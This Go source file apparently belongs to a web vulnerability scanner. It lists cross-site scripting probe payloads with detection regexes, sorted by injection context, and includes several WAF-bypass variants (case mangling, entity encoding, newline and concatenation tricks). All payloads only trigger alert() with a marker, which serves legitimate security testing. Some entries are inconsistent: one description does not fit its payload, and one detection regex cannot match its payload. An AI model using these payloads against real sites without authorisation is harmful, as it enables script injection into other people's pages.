package payloads

// XSSTest represents a single context-aware XSS test case.
type XSSTest struct {
	// PayloadTemplate is the payload template to be injected.
	// "DURSGO_MARKER" will be replaced with a unique string by the scanner.
	PayloadTemplate string

	// DetectionRegex is the regex template used to detect the payload in a vulnerable context.
	// "DURSGO_MARKER" will also be replaced here.
	DetectionRegex string

	// Description provides a brief summary of this test.
	Description string

	// Context tells the scanner where this payload is most effective.
	// Possible values: "HTML", "Attribute", "JS", "URL"
	Context string
}

// XSSMarker is used by the scanner to create unique payloads.
const XSSMarker = "DursgoXSS"

// XSSTests is the slice of XSSTest structs, now with context labels.
var XSSTests []XSSTest

func init() {
	XSSTests = []XSSTest{
		// --- Context: HTML (for injection directly into the HTML body) ---
		{
			PayloadTemplate: `<script>alert('DURSGO_MARKER')</script>`,
			DetectionRegex:  `(?i)<script>alert\('DURSGO_MARKER'\)</script>`,
			Description:     "Basic script tag injection",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `<svg/onload=alert('DURSGO_MARKER')>`,
			DetectionRegex:  `(?i)<svg/onload=alert\('DURSGO_MARKER'\)>`,
			Description:     "SVG tag with onload event handler",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `"><sVg/onload=confirm(1) class=DURSGO_MARKER>`,
			DetectionRegex:  `(?i)<svg/onload=confirm\(1\) class=DURSGO_MARKER>`,
			Description:     "Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `</ScriPt><sCripT class=DURSGO_MARKER>alert(1)</sCriPt>`,
			DetectionRegex:  `(?i)<script class=DURSGO_MARKER>alert\(1\)</script>`,
			Description:     "A classic script tag injection with case mangling. (DURSGO_MARKER)",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `<details/open/ontoggle=alert('DURSGO_MARKER')>`,
			DetectionRegex:  `(?i)<details/open/ontoggle=alert\('DURSGO_MARKER'\)>`,
			Description:     "details tag with ontoggle event handler",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `<iMg sRc=x oNeRrOr=alert('DURSGO_MARKER')>`,
			DetectionRegex:  `(?i)<img\s+src=x\s+onerror=alert\('DURSGO_MARKER'\)>`,
			Description:     "Event handler with mixed case (WAF bypass)",
			Context:         "HTML",
		},
		{
			PayloadTemplate: "<img\r\nsrc=x\r\nonerror=alert('DURSGO_MARKER')>",
			DetectionRegex:  `(?i)<img\s+src=x\s+onerror=alert\('DURSGO_MARKER'\)>`,
			Description:     "Tag obfuscation with newlines (WAF bypass)",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `<img/src=x/onerror=alert('DURSGO_MARKER')>`,
			DetectionRegex:  `(?i)<img/src=x/onerror=alert\('DURSGO_MARKER'\)>`,
			Description:     "Tag obfuscation with slashes instead of spaces",
			Context:         "HTML",
		},
		{
			PayloadTemplate: `<iframe src="javascript:alert('DURSGO_MARKER')"></iframe>`,
			DetectionRegex:  `(?i)<iframe\s+src="javascript:alert\('DURSGO_MARKER'\)"`,
			Description:     "iframe with javascript URI scheme",
			Context:         "HTML", // It's an HTML tag first
		},

		// --- Context: Attribute (for breaking out of an attribute value) ---
		{
			PayloadTemplate: `"><script>alert('DURSGO_MARKER')</script>`,
			DetectionRegex:  `(?i)><script>alert\('DURSGO_MARKER'\)</script>`,
			Description:     "Breaking out of a double-quoted HTML attribute",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `'> <script>alert('DURSGO_MARKER')</script>`,
			DetectionRegex:  `(?i)'>\s*<script>alert\('DURSGO_MARKER'\)</script>`,
			Description:     "Breaking out of a single-quoted HTML attribute",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `"><svg/onload=alert('DURSGO_MARKER')>`,
			DetectionRegex:  `(?i)><svg/onload=alert\('DURSGO_MARKER'\)>`,
			Description:     "SVG-based breakout from a double-quoted HTML attribute",
			Context:         "Attribute",
		},

		// Payloads for injecting event handlers without breaking the tag structure.
		// Effective when angle brackets are encoded but quotes are not.
		{
			PayloadTemplate: `"><svg onload=alert(DURSGO_MARKER)>`,
			DetectionRegex:  `"><svg onload=alert(DURSGO_MARKER)>`,
			Description:     "Injects an onmouseover event handler into a double-quoted attribute.",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `" onmouseover=alert('DURSGO_MARKER') data-test="`,
			DetectionRegex:  `onmouseover=alert\('DURSGO_MARKER'\)`,
			Description:     "Injects an onmouseover event handler into a double-quoted attribute.",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `' onmouseover=alert('DURSGO_MARKER') data-test='`,
			DetectionRegex:  `onmouseover=alert\('DURSGO_MARKER'\)`,
			Description:     "Injects an onmouseover event handler into a single-quoted attribute.",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `" autofocus onfocus=alert('DURSGO_MARKER') data-test="`,
			DetectionRegex:  `onfocus=alert\('DURSGO_MARKER'\)`,
			Description:     "Injects an onfocus event handler using autofocus into a double-quoted attribute.",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `' autofocus onfocus=alert('DURSGO_MARKER') data-test='`,
			DetectionRegex:  `onfocus=alert\('DURSGO_MARKER'\)`,
			Description:     "Injects an onfocus event handler using autofocus into a single-quoted attribute.",
			Context:         "Attribute",
		},
				{
			PayloadTemplate: `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;('DURSGO_MARKER')">`,
			DetectionRegex:  `(?i)onerror="&#97;&#108;&#101;&#114;&#116;\('DURSGO_MARKER'\)"`,
			Description:     "Event handler with HTML decimal entity encoding (WAF bypass)",
			Context:         "Attribute",
		},
		{
			PayloadTemplate: `<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;('DURSGO_MARKER')">`,
			DetectionRegex:  `(?i)onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;\('DURSGO_MARKER'\)"`,
			Description:     "Event handler with HTML hex entity encoding (WAF bypass)",
			Context:         "Attribute",
		},


		// --- Context: JS (for injection into a JavaScript string) ---
		{
			PayloadTemplate: `'-alert('DURSGO_MARKER')-'`,
			DetectionRegex:  `(?i)'-alert\('DURSGO_MARKER'\)-'`,
			Description:     "Breaking out of a JS string with single quotes",
			Context:         "JS",
		},
		{
			PayloadTemplate: `";alert('DURSGO_MARKER');//`,
			DetectionRegex:  `(?i)";alert\('DURSGO_MARKER'\);//`,
			Description:     "Breaking out of a JS string with double quotes",
			Context:         "JS",
		},
		{
			PayloadTemplate: "`;alert(`DURSGO_MARKER`);`",
			DetectionRegex:  `(?i)";alert\(\x60DURSGO_MARKER\x60\);"`,
			Description:     "JS injection using template literals",
			Context:         "JS",
		},
		{
			PayloadTemplate: `';window['ale'+'rt']('DURSGO_MARKER');//`,
			DetectionRegex:  `(?i)';window\['ale'\+'rt'\]\('DURSGO_MARKER'\);//`,
			Description:     "JS context bypass using string concatenation",
			Context:         "JS",
		},

		// --- Context: URL (for injection into a URL sink like href, src, etc.) ---
		{
			PayloadTemplate: `javascript:alert('DURSGO_MARKER')`,
			DetectionRegex:  `(?i)(?:href|src|data|action)\s*=\s*['"]?\s*javascript:alert\('DURSGO_MARKER'\)`,
			Description:     "javascript: URI scheme injection",
			Context:         "URL",
		},
	}
}
